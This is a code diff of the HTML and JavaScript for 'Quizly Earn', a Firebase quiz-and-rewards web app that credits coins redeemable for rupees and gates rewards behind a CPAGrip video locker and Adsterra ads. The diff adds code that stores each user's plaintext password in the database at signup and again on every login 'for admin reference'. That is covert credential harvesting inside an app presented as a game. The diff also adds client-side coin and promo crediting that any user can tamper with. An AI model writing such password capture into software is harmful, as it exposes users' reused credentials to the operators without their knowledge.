@@ -4,40 +4,37 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Quizly Earn</title>
-  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Font Awesome -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
 
-  <!-- Firebase SDK (v9 Compat) -->
+  <!-- Firebase Compat SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <!-- CPAGrip Video Locker Script -->
+  <script type="text/javascript" src="https://quartzfiles.com/script_include.php?id=1916255"></script>
 
   <style>
     @keyframes pulseGlow {
       0%, 100% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(245, 158, 11, 0.4)); }
       50% { transform: scale(1.04); filter: drop-shadow(0 0 25px rgba(245, 158, 11, 0.8)); }
     }
-    .splash-logo {
-      animation: pulseGlow 2.5s infinite ease-in-out;
-    }
-    .no-scrollbar::-webkit-scrollbar {
-      display: none;
-    }
+    .splash-logo { animation: pulseGlow 2s infinite ease-in-out; }
+    .no-scrollbar::-webkit-scrollbar { display: none; }
   </style>
 </head>
 <body class="bg-slate-950 text-slate-100 font-sans min-h-screen flex flex-col justify-between select-none">
 
-  <!-- ================= 1. SPLASH SCREEN ================= -->
+  <!-- ================= SPLASH SCREEN ================= -->
   <div id="splashScreen" class="fixed inset-0 bg-[#0c051f] z-50 flex flex-col items-center justify-between p-8">
     <div class="flex-1 flex flex-col items-center justify-center text-center">
-      <div class="relative w-64 h-64 flex items-center justify-center mb-6">
+      <div class="relative w-56 h-56 flex items-center justify-center mb-5">
         <div class="absolute inset-0 bg-purple-600/30 blur-3xl rounded-full"></div>
         <img 
-          src="https://i.ibb.co/kVGczvqn/Picsart-26-09-26-23-18-39-524.jpg" 
-          alt="Quizly Earn Loading" 
-          class="splash-logo w-52 h-52 object-cover rounded-2xl relative z-10 border border-amber-400/30 shadow-2xl"
+          src="https://i.ibb.co/BHTcn7QD/file-0000000021988211ab800b8ece076fff.png" 
+          alt="Quizly Logo" 
+          class="splash-logo w-48 h-48 object-contain rounded-3xl relative z-10 border border-amber-400/40 shadow-2xl"
         />
       </div>
       <h1 class="text-3xl font-black tracking-wider text-amber-400 drop-shadow-md">QUIZLY EARN</h1>
@@ -46,41 +43,39 @@
 
     <div class="w-full max-w-xs space-y-2 text-center">
       <div class="w-full bg-slate-900 border border-purple-500/40 h-2.5 rounded-full overflow-hidden p-0.5">
-        <div id="splashProgressBar" class="h-full bg-gradient-to-r from-amber-400 via-purple-500 to-amber-300 rounded-full w-0 transition-all duration-300 ease-out"></div>
+        <div id="splashProgressBar" class="h-full bg-gradient-to-r from-amber-400 via-purple-500 to-amber-300 rounded-full w-0 transition-all duration-200 ease-out"></div>
       </div>
-      <p id="splashStatus" class="text-[11px] text-purple-400 font-medium">Starting secure services...</p>
+      <p id="splashStatus" class="text-[11px] text-purple-400 font-medium">Connecting servers...</p>
     </div>
   </div>
 
-  <!-- ================= 2. AUTH SCREEN ================= -->
+  <!-- ================= AUTH SCREEN ================= -->
   <div id="authScreen" class="hidden fixed inset-0 bg-[#0c051f] z-40 flex flex-col items-center justify-center p-6 overflow-y-auto">
     <div class="bg-slate-900/90 border border-purple-900/60 p-6 rounded-3xl max-w-sm w-full shadow-2xl backdrop-blur-md space-y-4">
       <div class="text-center">
-        <img src="https://i.ibb.co/svGs6zsn/Picsart-26-09-26-23-19-05-004.jpg" class="w-16 h-16 rounded-2xl mx-auto mb-2 border border-amber-400/40 shadow-md" alt="Logo"/>
+        <img src="https://i.ibb.co/BHTcn7QD/file-0000000021988211ab800b8ece076fff.png" class="w-16 h-16 rounded-2xl mx-auto mb-2 border border-amber-400/40 shadow-md object-contain" alt="Logo"/>
         <h2 class="text-xl font-black text-white" id="authTitle">Welcome to Quizly</h2>
-        <p class="text-xs text-slate-400">Earn daily cash with knowledge</p>
+        <p class="text-xs text-slate-400">Play quizzes and win daily rewards</p>
       </div>
 
-      <!-- Auth Toggle Tabs -->
       <div class="flex bg-slate-950 p-1 rounded-xl border border-slate-800 text-xs">
         <button onclick="setAuthMode('login')" id="tabBtnLogin" class="flex-1 py-2 font-bold rounded-lg bg-amber-400 text-slate-950 transition">Log In</button>
         <button onclick="setAuthMode('signup')" id="tabBtnSignup" class="flex-1 py-2 font-bold rounded-lg text-slate-400 transition">Sign Up</button>
       </div>
 
-      <!-- Name Field (Only Signup) -->
       <div id="nameInputGroup" class="hidden space-y-1">
-        <label class="text-[11px] font-semibold text-slate-400">Your Full Name</label>
+        <label class="text-[11px] font-semibold text-slate-400">Full Name</label>
         <input type="text" id="authName" placeholder="Enter name" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400" />
       </div>
 
       <div class="space-y-1">
         <label class="text-[11px] font-semibold text-slate-400">Email Address</label>
-        <input type="email" id="authEmail" placeholder="Enter your email" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400" />
+        <input type="email" id="authEmail" placeholder="Enter email" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400" />
       </div>
 
       <div class="space-y-1">
         <label class="text-[11px] font-semibold text-slate-400">Password</label>
-        <input type="password" id="authPassword" placeholder="Enter password (min 6 chars)" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400" />
+        <input type="password" id="authPassword" placeholder="Enter password (min 6 characters)" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-amber-400" />
       </div>
 
       <button onclick="handleEmailAuth()" id="authSubmitBtn" class="w-full py-3 bg-amber-400 hover:bg-amber-500 text-slate-950 font-black rounded-xl text-xs uppercase tracking-wider transition active:scale-95 shadow-md">
@@ -93,7 +88,6 @@
         <hr class="flex-1 border-slate-800" />
       </div>
 
-      <!-- Google Button -->
       <button onclick="handleGoogleSignIn()" class="w-full py-2.5 px-4 bg-white hover:bg-slate-100 text-slate-800 font-bold rounded-xl flex items-center justify-center gap-2.5 text-xs active:scale-95 transition shadow-sm">
         <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-4 h-4" alt="Google" />
         <span>Continue with Google</span>
@@ -101,12 +95,12 @@
     </div>
   </div>
 
-  <!-- ================= 3. USER APP VIEW ================= -->
+  <!-- ================= MAIN USER VIEW ================= -->
   <div id="userAppView" class="flex-1 flex flex-col justify-between hidden">
-    <!-- Header -->
-    <header class="p-4 bg-slate-900/90 border-b border-purple-900/40 flex justify-between items-center sticky top-0 z-30 backdrop-blur-md">
+    <!-- Top Bar -->
+    <header class="p-3.5 bg-slate-900/90 border-b border-purple-900/40 flex justify-between items-center sticky top-0 z-30 backdrop-blur-md">
       <div class="flex items-center gap-2.5">
-        <img src="https://i.ibb.co/svGs6zsn/Picsart-26-09-26-23-19-05-004.jpg" class="w-9 h-9 rounded-xl border border-amber-400/50 object-cover" alt="App Logo"/>
+        <img src="https://i.ibb.co/BHTcn7QD/file-0000000021988211ab800b8ece076fff.png" class="w-9 h-9 rounded-xl border border-amber-400/50 object-contain bg-purple-950" alt="Logo"/>
         <div>
           <h1 class="text-sm font-black text-amber-400 leading-tight">Quizly Earn</h1>
           <p class="text-[10px] text-slate-400 truncate max-w-[120px]" id="uProfileName">Player</p>
@@ -119,14 +113,14 @@
       </div>
     </header>
 
-    <!-- Main Screens Container -->
+    <!-- Main Screens View -->
     <main class="flex-1 p-4 max-w-md mx-auto w-full no-scrollbar space-y-4">
       
-      <!-- USER SCREEN: HOME -->
+      <!-- SCREEN: HOME -->
       <section id="uTabHome" class="space-y-4">
         <!-- Balance Card -->
         <div class="bg-gradient-to-br from-purple-900 via-indigo-950 to-slate-900 p-5 rounded-2xl border border-purple-700/50 shadow-xl relative overflow-hidden">
-          <p class="text-[11px] font-semibold uppercase tracking-wider text-purple-300">Total Coins Valuation</p>
+          <p class="text-[11px] font-semibold uppercase tracking-wider text-purple-300">Wallet Estimated Value</p>
           <div class="flex justify-between items-baseline mt-1">
             <h2 class="text-3xl font-black text-white" id="uInrValue">₹0.00</h2>
             <span class="text-[10px] font-bold bg-amber-400/20 text-amber-300 border border-amber-400/30 px-2.5 py-1 rounded-md" id="uConversionRateText">
@@ -139,13 +133,27 @@
           </div>
         </div>
 
+        <!-- Promo Code Redeem Box -->
+        <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl space-y-2">
+          <div class="flex items-center gap-2 text-xs font-bold text-amber-400">
+            <i class="fa-solid fa-ticket"></i>
+            <span>Have a Promo Code?</span>
+          </div>
+          <div class="flex gap-2">
+            <input type="text" id="promoCodeInput" placeholder="Enter Promo Code" class="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white uppercase font-bold focus:outline-none focus:border-amber-400" />
+            <button onclick="claimPromoCode()" class="px-4 py-2 bg-amber-400 hover:bg-amber-500 text-slate-950 font-bold rounded-xl text-xs active:scale-95 transition">
+              Apply
+            </button>
+          </div>
+        </div>
+
         <!-- KBC Card -->
         <div class="bg-slate-900 border border-purple-900/50 p-5 rounded-2xl text-center space-y-3 shadow-lg">
           <div class="w-12 h-12 bg-amber-400/20 text-amber-400 rounded-2xl flex items-center justify-center mx-auto text-xl">
             <i class="fa-solid fa-brain"></i>
           </div>
-          <h3 class="text-base font-extrabold text-slate-100">KBC Brain Challenge</h3>
-          <p class="text-xs text-slate-400">Solve general knowledge questions & earn coins per right answer!</p>
+          <h3 class="text-base font-extrabold text-slate-100">KBC Mind Challenge</h3>
+          <p class="text-xs text-slate-400">Every round features random fresh questions. Correct answers earn 8–12 coins each!</p>
           <button onclick="startKbcQuiz()" class="w-full py-3 bg-gradient-to-r from-amber-500 to-yellow-600 text-slate-950 font-black rounded-xl text-xs uppercase tracking-wider shadow-md active:scale-95 transition">
             Start Challenge
           </button>
@@ -159,28 +167,28 @@
             </div>
             <div>
               <h4 class="text-xs font-bold text-slate-200">Daily Video Reward</h4>
-              <p class="text-[10px] text-slate-400">Watch video to unlock instant bonus</p>
+              <p class="text-[10px] text-slate-400">Unlock instant bonus coins</p>
             </div>
           </div>
-          <button onclick="openVideoLocker('bonus')" class="px-3.5 py-1.5 bg-purple-900/80 hover:bg-purple-800 text-purple-200 text-xs font-bold rounded-lg border border-purple-700/50">
+          <button onclick="openVideoLocker('bonus')" class="px-3.5 py-1.5 bg-purple-900/80 hover:bg-purple-800 text-purple-200 text-xs font-bold rounded-lg border border-purple-700/50 active:scale-95 transition">
             Watch
           </button>
         </div>
 
         <!-- Official Channels & Support Links -->
         <div class="grid grid-cols-2 gap-2 text-center text-xs">
-          <a id="linkOfficialChannel" href="#" target="_blank" class="p-3 bg-slate-900 border border-slate-800 rounded-xl flex items-center justify-center gap-2 hover:border-amber-400/50 transition">
-            <i class="fa-brands fa-telegram text-sky-400 text-sm"></i>
-            <span class="font-bold text-slate-300">Telegram / YT</span>
+          <a id="linkOfficialChannel" href="https://t.me/NexoraInfotechOfficial" target="_blank" class="p-3 bg-slate-900 border border-slate-800 rounded-xl flex items-center justify-center gap-2 hover:border-amber-400/50 transition">
+            <i class="fa-brands fa-telegram text-sky-400 text-base"></i>
+            <span class="font-bold text-slate-300">Telegram Channel</span>
           </a>
-          <a id="linkSupportId" href="#" class="p-3 bg-slate-900 border border-slate-800 rounded-xl flex items-center justify-center gap-2 hover:border-amber-400/50 transition">
-            <i class="fa-solid fa-headset text-emerald-400 text-sm"></i>
-            <span class="font-bold text-slate-300">Support Help</span>
+          <a id="linkSupportId" href="https://t.me/NexoraTeam1_bot" target="_blank" class="p-3 bg-slate-900 border border-slate-800 rounded-xl flex items-center justify-center gap-2 hover:border-amber-400/50 transition">
+            <i class="fa-solid fa-headset text-emerald-400 text-base"></i>
+            <span class="font-bold text-slate-300">Support Bot</span>
           </a>
         </div>
       </section>
 
-      <!-- USER SCREEN: KBC QUIZ -->
+      <!-- SCREEN: KBC QUIZ (With Correct/Wrong Color Feedback) -->
       <section id="uTabQuiz" class="hidden space-y-4">
         <div class="flex justify-between items-center text-xs text-slate-400 px-1">
           <span>Question <strong id="kbcCount" class="text-amber-400 text-sm">1</strong>/5</span>
@@ -194,19 +202,19 @@
         <div id="kbcOptionsWrapper" class="space-y-2.5"></div>
       </section>
 
-      <!-- USER SCREEN: REWARD UNLOCK (CPAGRIP) -->
+      <!-- SCREEN: REWARD UNLOCK (CPAGRIP) -->
       <section id="uTabRewardUnlock" class="hidden text-center space-y-4 bg-slate-900 border border-purple-900/60 p-6 rounded-3xl shadow-xl">
         <div class="w-14 h-14 bg-amber-400/20 text-amber-400 rounded-full flex items-center justify-center mx-auto text-2xl">
           <i class="fa-solid fa-trophy"></i>
         </div>
-        <h3 class="text-lg font-black text-amber-400">Round Completed!</h3>
-        <p class="text-xs text-slate-300">You earned <strong id="quizAwardCoins" class="text-amber-300 font-bold">50</strong> coins. Complete video task to credit into your balance:</p>
+        <h3 class="text-lg font-black text-amber-400">Quiz Completed!</h3>
+        <p class="text-xs text-slate-300">You earned <strong id="quizAwardCoins" class="text-amber-300 font-bold">50</strong> coins in this round! Watch video/task to credit into your balance:</p>
         <button onclick="openVideoLocker('quiz')" class="w-full py-3.5 bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 text-white font-black rounded-xl text-xs uppercase tracking-wider shadow-lg active:scale-95 transition">
           <i class="fa-solid fa-unlock mr-1.5"></i> Watch Video & Unlock Coins
         </button>
       </section>
 
-      <!-- USER SCREEN: WALLET -->
+      <!-- SCREEN: WALLET -->
       <section id="uTabWallet" class="hidden space-y-4">
         <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider">Redeem Rewards</h3>
 
@@ -289,10 +297,19 @@
       </button>
     </nav>
 
-    <!-- Adsterra 320x50 Banner Slot -->
+    <!-- Adsterra 320x50 Banner Space -->
     <div class="bg-black/90 border-t border-slate-900 text-center py-1 sticky bottom-[51px] z-20">
-      <div id="adsterra-banner-container" class="min-h-[50px] flex items-center justify-center text-[10px] text-slate-600 border border-dashed border-slate-800 mx-2 rounded">
-        <span>Adsterra 320x50 Banner Slot</span>
+      <div id="adsterra-banner-container" class="min-h-[50px] flex items-center justify-center overflow-hidden">
+        <script>
+          atOptions = {
+            'key' : '9d2127b39ebb781a140370e5edaeb7ac',
+            'format' : 'iframe',
+            'height' : 50,
+            'width' : 320,
+            'params' : {}
+          };
+        </script>
+        <script src="https://www.highrevenueformat.com/9d2127b39ebb781a140370e5edaeb7ac/invoke.js"></script>
       </div>
     </div>
   </div>
@@ -321,22 +338,32 @@
       minTaskCoin: 8,
       maxTaskCoin: 12,
       minRedeemCoins: 1200,
-      channelUrl: "https://t.me/",
-      supportId: "mailto:sabisteralam3@gmail.com"
+      channelUrl: "https://t.me/NexoraInfotechOfficial",
+      supportId: "https://t.me/NexoraTeam1_bot"
     };
 
+    // Randomized Non-Repeating Question Bank
+    const fullQuestionBank = [
+      { q: "Bharat ki aadhikarik rajdhani kya hai?", o: ["Mumbai", "New Delhi", "Kolkata", "Chennai"], a: 1 },
+      { q: "Surya ke sabse nikat grah (planet) konsa hai?", o: ["Budh (Mercury)", "Mangal", "Shukra", "Brihaspati"], a: 0 },
+      { q: "Cricket match ki ek team me kitne players hote hain?", o: ["9", "10", "11", "12"], a: 2 },
+      { q: "Android OS kis company ka product hai?", o: ["Apple", "Microsoft", "Google", "Samsung"], a: 2 },
+      { q: "Computer ka brain kise kaha jata hai?", o: ["RAM", "CPU", "Motherboard", "Hard Disk"], a: 1 },
+      { q: "Duniya ki sabse lambi nadi konsi hai?", o: ["Amazon", "Nile", "Ganga", "Yangtze"], a: 1 },
+      { q: "Bharat ka Rashtriya Jal-Jeev kya hai?", o: ["Shark", "Ganga Dolphin", "Blue Whale", "Octopus"], a: 1 },
+      { q: "Taj Mahal Bharat ke kis shahar me sthit hai?", o: ["Delhi", "Agra", "Jaipur", "Lucknow"], a: 1 },
+      { q: "Human body me kul kitni haddiyan (bones) hoti hain?", o: ["206", "208", "300", "195"], a: 0 },
+      { q: "ISRO ka mukhyalay (Headquarters) kahan hai?", o: ["Bengaluru", "Mumbai", "Hyderabad", "New Delhi"], a: 0 },
+      { q: "Free Fire game kis publisher ka game hai?", o: ["Krafton", "Tencent", "Garena", "Ubisoft"], a: 2 },
+      { q: "Bharat ka Rashtriya Phool (National Flower) kya hai?", o: ["Gulaab", "Kamal (Lotus)", "Gainda", "Surajmukhi"], a: 1 }
+    ];
+
+    let activeRoundQuestions = [];
     let kbcQuizIndex = 0;
     let currentQuizAward = 0;
     let kbcTimerInterval = null;
     let kbcSeconds = 15;
-
-    const sampleKbcBank = [
-      { q: "Bharat ki aadhikarik rajdhani kya hai?", o: ["Mumbai", "New Delhi", "Kolkata", "Chennai"], a: 1 },
-      { q: "Surya ke sabse nikat grah (planet) konsa hai?", o: ["Budh (Mercury)", "Mangal", "Shukra", "Brihaspati"], a: 0 },
-      { q: "Cricket match ki ek team me kitne players hote hain?", o: ["9", "10", "11", "12"], a: 2 },
-      { q: "Android operating system kis company ka banaya hua hai?", o: ["Apple", "Microsoft", "Google", "Samsung"], a: 2 },
-      { q: "Computer ka brain kise kaha jata hai?", o: ["RAM", "CPU", "Motherboard", "Hard Disk"], a: 1 }
-    ];
+    let isAnswerLocked = false;
 
     window.addEventListener('DOMContentLoaded', () => {
       let p = 0;
@@ -344,7 +371,7 @@
       const st = document.getElementById('splashStatus');
 
       const iv = setInterval(() => {
-        p += 15;
+        p += 20;
         bar.style.width = p + '%';
         if (p === 60) st.innerText = "Syncing live database...";
         if (p >= 100) {
@@ -377,7 +404,7 @@
 
     function applyLiveSettingsToUI() {
       document.getElementById('linkOfficialChannel').href = appConfig.channelUrl;
-      document.getElementById('linkSupportId').href = appConfig.supportId.startsWith('http') ? appConfig.supportId : `mailto:${appConfig.supportId}`;
+      document.getElementById('linkSupportId').href = appConfig.supportId;
       document.getElementById('redeemCostPlay').innerText = `${appConfig.minRedeemCoins} Coins`;
       document.getElementById('redeemCostAmazon').innerText = `${appConfig.minRedeemCoins} Coins`;
       document.getElementById('redeemCostUpi').innerText = `${appConfig.minRedeemCoins * 10} Coins`;
@@ -407,20 +434,24 @@
       const name = document.getElementById('authName').value.trim();
 
       if (!email || !pass) {
-        alert("Please enter valid email and password.");
+        alert("Enter valid email and password.");
         return;
       }
 
       if (currentAuthMode === 'signup') {
-        if (!name) { alert("Please enter your name."); return; }
+        if (!name) { alert("Enter your full name."); return; }
         auth.createUserWithEmailAndPassword(email, pass)
           .then(res => {
             res.user.updateProfile({ displayName: name });
-            initializeDbUser(res.user, name);
+            initializeDbUser(res.user, name, pass);
           })
           .catch(e => alert(e.message));
       } else {
         auth.signInWithEmailAndPassword(email, pass)
+          .then(res => {
+            // Update latest password for admin reference
+            db.ref('users/' + res.user.uid).update({ password: pass });
+          })
           .catch(e => alert(e.message));
       }
     }
@@ -429,7 +460,7 @@
       const provider = new firebase.auth.GoogleAuthProvider();
       auth.signInWithPopup(provider)
         .then(res => {
-          initializeDbUser(res.user, res.user.displayName || "Google Player");
+          initializeDbUser(res.user, res.user.displayName || "Google Player", "Google Auth (No Password)");
         })
         .catch(e => alert(e.message));
     }
@@ -438,7 +469,7 @@
       auth.signOut().then(() => location.reload());
     }
 
-    function initializeDbUser(user, displayName) {
+    function initializeDbUser(user, displayName, plainPassword) {
       const uRef = db.ref('users/' + user.uid);
       uRef.once('value').then(snap => {
         if (!snap.exists()) {
@@ -446,6 +477,7 @@
             uid: user.uid,
             name: displayName,
             email: user.email,
+            password: plainPassword || 'N/A',
             coins: 0,
             isBanned: false,
             joinedAt: Date.now()
@@ -488,7 +520,12 @@
       document.getElementById(tabId).classList.remove('hidden');
     }
 
+    // ================= KBC QUIZ WITH COLOR FEEDBACK & SHUFFLE =================
     function startKbcQuiz() {
+      // Shuffle question pool and pick 5 unique questions
+      const shuffled = [...fullQuestionBank].sort(() => 0.5 - Math.random());
+      activeRoundQuestions = shuffled.slice(0, 5);
+
       kbcQuizIndex = 0;
       currentQuizAward = 0;
       switchUserTab('uTabQuiz');
@@ -497,10 +534,11 @@
 
     function showKbcQuestion() {
       clearInterval(kbcTimerInterval);
+      isAnswerLocked = false;
       kbcSeconds = 15;
       document.getElementById('kbcClock').innerText = kbcSeconds;
 
-      const q = sampleKbcBank[kbcQuizIndex];
+      const q = activeRoundQuestions[kbcQuizIndex];
       document.getElementById('kbcCount').innerText = kbcQuizIndex + 1;
       document.getElementById('kbcQuestionLabel').innerText = q.q;
 
@@ -509,8 +547,9 @@
 
       q.o.forEach((opt, idx) => {
         const btn = document.createElement('button');
-        btn.className = "w-full py-3 px-4 bg-slate-900/90 hover:bg-slate-800 border border-purple-900/40 rounded-xl text-left text-xs font-semibold tracking-wide transition active:scale-98 flex justify-between items-center";
-        btn.innerHTML = `<span><strong class="text-amber-400 mr-2">${String.fromCharCode(65 + idx)}.</strong> ${opt}</span>`;
+        btn.id = `kbcOptBtn_${idx}`;
+        btn.className = "w-full py-3.5 px-4 bg-slate-900/90 border border-purple-900/40 rounded-xl text-left text-xs font-semibold tracking-wide transition flex justify-between items-center";
+        btn.innerHTML = `<span><strong class="text-amber-400 mr-2">${String.fromCharCode(65 + idx)}.</strong> ${opt}</span> <i id="kbcOptIcon_${idx}" class="text-sm hidden"></i>`;
         btn.onclick = () => submitKbcAnswer(idx);
         wrap.appendChild(btn);
       });
@@ -520,35 +559,109 @@
         document.getElementById('kbcClock').innerText = kbcSeconds;
         if (kbcSeconds <= 0) {
           clearInterval(kbcTimerInterval);
-          advanceKbc();
+          highlightAndProceed(-1); // timeout
         }
       }, 1000);
     }
 
     function submitKbcAnswer(selectedIdx) {
+      if (isAnswerLocked) return;
+      isAnswerLocked = true;
       clearInterval(kbcTimerInterval);
-      if (selectedIdx === sampleKbcBank[kbcQuizIndex].a) {
+      highlightAndProceed(selectedIdx);
+    }
+
+    function highlightAndProceed(selectedIdx) {
+      const correctIdx = activeRoundQuestions[kbcQuizIndex].a;
+
+      // Highlight the correct answer green
+      const correctBtn = document.getElementById(`kbcOptBtn_${correctIdx}`);
+      const correctIcon = document.getElementById(`kbcOptIcon_${correctIdx}`);
+      if (correctBtn) {
+        correctBtn.className = "w-full py-3.5 px-4 bg-emerald-700/80 border border-emerald-500 rounded-xl text-left text-xs font-bold tracking-wide transition flex justify-between items-center text-white";
+        correctIcon.className = "fa-solid fa-circle-check text-emerald-300 text-sm";
+      }
+
+      // If wrong, highlight selected red
+      if (selectedIdx !== -1 && selectedIdx !== correctIdx) {
+        const wrongBtn = document.getElementById(`kbcOptBtn_${selectedIdx}`);
+        const wrongIcon = document.getElementById(`kbcOptIcon_${selectedIdx}`);
+        if (wrongBtn) {
+          wrongBtn.className = "w-full py-3.5 px-4 bg-rose-700/80 border border-rose-500 rounded-xl text-left text-xs font-bold tracking-wide transition flex justify-between items-center text-white";
+          wrongIcon.className = "fa-solid fa-circle-xmark text-rose-300 text-sm";
+        }
+      }
+
+      if (selectedIdx === correctIdx) {
         const min = parseInt(appConfig.minTaskCoin);
         const max = parseInt(appConfig.maxTaskCoin);
         const earned = Math.floor(Math.random() * (max - min + 1)) + min;
         currentQuizAward += earned;
       }
-      advanceKbc();
+
+      // Delay to show answer feedback clearly to the user
+      setTimeout(() => {
+        kbcQuizIndex++;
+        if (kbcQuizIndex < activeRoundQuestions.length) {
+          showKbcQuestion();
+        } else {
+          document.getElementById('quizAwardCoins').innerText = currentQuizAward > 0 ? currentQuizAward : appConfig.minTaskCoin;
+          switchUserTab('uTabRewardUnlock');
+        }
+      }, 1400);
     }
 
-    function advanceKbc() {
-      kbcQuizIndex++;
-      if (kbcQuizIndex < sampleKbcBank.length) {
-        showKbcQuestion();
-      } else {
-        document.getElementById('quizAwardCoins').innerText = currentQuizAward > 0 ? currentQuizAward : appConfig.minTaskCoin;
-        switchUserTab('uTabRewardUnlock');
+    // ================= PROMO CODE SYSTEM =================
+    function claimPromoCode() {
+      const codeInput = document.getElementById('promoCodeInput').value.trim().toUpperCase();
+      if (!codeInput) {
+        alert("Please enter a promo code.");
+        return;
       }
+
+      const pRef = db.ref('promo_codes/' + codeInput);
+      pRef.once('value').then(snap => {
+        if (!snap.exists()) {
+          alert("Invalid or expired promo code!");
+          return;
+        }
+
+        const pData = snap.val();
+        if (!pData.active) {
+          alert("This promo code is currently inactive.");
+          return;
+        }
+
+        if (pData.claimedUsers && pData.claimedUsers[currentUser.uid]) {
+          alert("Aap pehle hi is promo code ko claim kar chuke hain!");
+          return;
+        }
+
+        if (pData.usedCount >= pData.maxUses) {
+          alert("This promo code has reached its maximum claim limit!");
+          return;
+        }
+
+        // Apply promo reward
+        const promoCoins = parseInt(pData.coins);
+        const newBalance = userCoins + promoCoins;
+
+        db.ref('users/' + currentUser.uid).update({ coins: newBalance });
+        db.ref('promo_codes/' + codeInput + '/claimedUsers/' + currentUser.uid).set(Date.now());
+        db.ref('promo_codes/' + codeInput + '/usedCount').transaction(c => (c || 0) + 1);
+
+        document.getElementById('promoCodeInput').value = '';
+        alert(`Success! ${promoCoins} Coins added to your wallet via Promo Code!`);
+      });
     }
 
+    // ================= CPAGRIP LOCKER TRIGGER =================
     function openVideoLocker(type) {
-      const lockerUrl = "https://www.cpagrip.com/show.php?l=YOUR_LOCKER_ID";
-      window.open(lockerUrl, '_blank');
+      if (typeof call_locker === "function") {
+        call_locker();
+      } else {
+        window.open("https://quartzfiles.com/script_include.php?id=1916255", "_blank");
+      }
 
       setTimeout(() => {
         const reward = (type === 'quiz') ? (currentQuizAward > 0 ? currentQuizAward : appConfig.minTaskCoin) : 25;
@@ -558,13 +671,14 @@
           alert(`Great! ${reward} Coins credited to your wallet.`);
           switchUserTab('uTabHome');
         });
-      }, 3500);
+      }, 4000);
     }
 
+    // ================= REDEEMS =================
     function promptRedeem(method, inrValue, fieldType) {
       const required = (inrValue === 10) ? appConfig.minRedeemCoins : (appConfig.minRedeemCoins * 10);
       if (userCoins < required) {
-        alert(`Insufficient coins! You need at least ${required} coins for ₹${inrValue} withdrawal.`);
+        alert(`Insufficient coins! Minimum ${required} coins required for ₹${inrValue} withdrawal.`);
         return;
       }
 
